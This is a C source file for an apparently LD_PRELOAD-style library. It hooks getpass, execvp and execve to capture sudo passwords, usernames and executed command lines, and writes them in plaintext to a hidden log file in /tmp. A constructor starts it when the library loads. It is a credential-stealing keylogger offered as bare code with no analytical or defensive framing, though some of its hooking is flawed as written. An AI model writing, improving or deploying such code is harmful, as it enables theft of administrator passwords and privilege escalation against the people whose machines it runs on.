#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <time.h>
#include <pwd.h>
#include <sys/types.h>

#define CRED_LOG "/tmp/.sudo_creds.log"
#define DEBUG_LOG "/tmp/.sudo_hook_debug.log"

static char* (*orig_getpass)(const char*) = NULL;
static int (*orig_execvp)(const char*, char* const*) = NULL;
static int (*orig_execve)(const char*, char* const*, char* const*) = NULL;

void log_sudo_credential(const char* username, const char* password, const char* command) {
    FILE* log = fopen(CRED_LOG, "a");
    if (!log) return;
    
    time_t now = time(NULL);
    char* timestamp = ctime(&now);
    timestamp[strlen(timestamp) - 1] = '\0';
    
    fprintf(log, "[%s] SUDO: user=%s, pass=%s, cmd=%s, pid=%d\n", 
            timestamp, username ? username : "unknown", 
            password ? password : "[hidden]", 
            command ? command : "unknown", getpid());
    fclose(log);
}

void debug_log(const char* message) {
    FILE* log = fopen(DEBUG_LOG, "a");
    if (!log) return;
    
    time_t now = time(NULL);
    char* timestamp = ctime(&now);
    timestamp[strlen(timestamp) - 1] = '\0';
    
    fprintf(log, "[%s] PID=%d: %s\n", timestamp, getpid(), message);
    fclose(log);
}

char* get_current_username() {
    struct passwd* pw = getpwuid(getuid());
    return pw ? pw->pw_name : "unknown";
}

char* hooked_getpass(const char* prompt) {
    debug_log("sudo getpass() intercepted");
    
    if (!orig_getpass) {
        orig_getpass = dlsym(RTLD_NEXT, "getpass");
    }
    
    char* password = orig_getpass(prompt);
    
    if (password && strlen(password) > 0) {
        if (strstr(prompt, "password") || strstr(prompt, "Password")) {
            char* username = get_current_username();
            debug_log("Sudo password captured");
            log_sudo_credential(username, password, "sudo_command");
        }
    }
    
    return password;
}

int hooked_execvp(const char* file, char* const argv[]) {
    debug_log("execvp() intercepted in sudo context");
    
    if (!orig_execvp) {
        orig_execvp = dlsym(RTLD_NEXT, "execvp");
    }
    
    if (argv && argv[0]) {
        char command_line[1024] = {0};
        for (int i = 0; argv[i] && strlen(command_line) < 900; i++) {
            strcat(command_line, argv[i]);
            if (argv[i + 1]) strcat(command_line, " ");
        }
        
        char* username = get_current_username();
        log_sudo_credential(username, "[execvp]", command_line);
    }
    
    return orig_execvp(file, argv);
}

int hooked_execve(const char* pathname, char* const argv[], char* const envp[]) {
    debug_log("execve() intercepted in sudo context");
    
    if (!orig_execve) {
        orig_execve = dlsym(RTLD_NEXT, "execve");
    }
    
    if (argv && argv[0]) {
        char command_line[1024] = {0};
        for (int i = 0; argv[i] && strlen(command_line) < 900; i++) {
            strcat(command_line, argv[i]);
            if (argv[i + 1]) strcat(command_line, " ");
        }
        
        char* username = get_current_username();
        log_sudo_credential(username, "[execve]", command_line);
    }
    
    return orig_execve(pathname, argv, envp);
}

__attribute__((constructor))
void sudo_hook_init() {
    debug_log("Sudo credential hook initialized");
    
    if (!orig_getpass) {
        orig_getpass = dlsym(RTLD_NEXT, "getpass");
    }
    if (!orig_execvp) {
        orig_execvp = dlsym(RTLD_NEXT, "execvp");
    }
    if (!orig_execve) {
        orig_execve = dlsym(RTLD_NEXT, "execve");
    }
}